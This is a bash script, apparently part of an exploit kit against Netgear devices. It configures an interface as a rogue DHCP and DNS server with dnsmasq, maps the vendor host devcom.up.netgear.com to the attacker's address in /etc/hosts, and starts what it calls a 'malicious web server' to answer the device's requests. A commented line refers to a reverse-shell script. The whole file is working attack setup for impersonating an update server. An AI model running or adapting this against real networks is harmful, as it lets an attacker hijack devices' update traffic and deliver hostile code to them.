#!/bin/bash


ip=192.168.37.1
start_range=192.168.37.100
end_range=192.168.37.200

usage() { echo "Usage: $0 <interface>" 1>&2; exit 1; }

if [ -z $1 ]; then
    usage;
fi

if [[ $EUID -ne 0 ]]; then
   echo "Must be run as root: sudo ./run.sh -i <interface>"
   exit 1
fi

interface=$1
trap ctrl_c INT

function ctrl_c() {
        kill $(ps aux | grep 'dnsmasq' | awk '{print $2}') 2>/dev/null;
        exit 1;
}

echo "[+] Setting up interface: $interface and IP: $ip";
ifconfig $interface down;
ifconfig $interface $ip netmask 255.255.255.0;
ifconfig $interface up;

echo "$ip devcom.up.netgear.com" >> /etc/hosts
#echo "$ip reverse-shell.sh" >> /etc/hosts

echo "[+] Setting up DNS and dhcpd server";
echo "  [~] DNS: $ip";
echo "  [~] DHCP range: $start_range - $end_range";

dnsmasq --interface=$interface --bind-interfaces --except-interface=lo \
--dhcp-range=$start_range,$end_range,1h  --conf-file=/dev/null \
--dhcp-option=6,$ip --dhcp-option=3,$ip

sleep 1

# remove last line added to /etc/hosts
cp /etc/hosts /etc/hosts.tmp; head -n -1 /etc/hosts.tmp > /etc/hosts; rm -f /etc/hosts.tmp;

echo "[+] Running malicious web server, waiting for requests..";
python3 web_server.py $ip 2>/dev/null

ctrl_c;
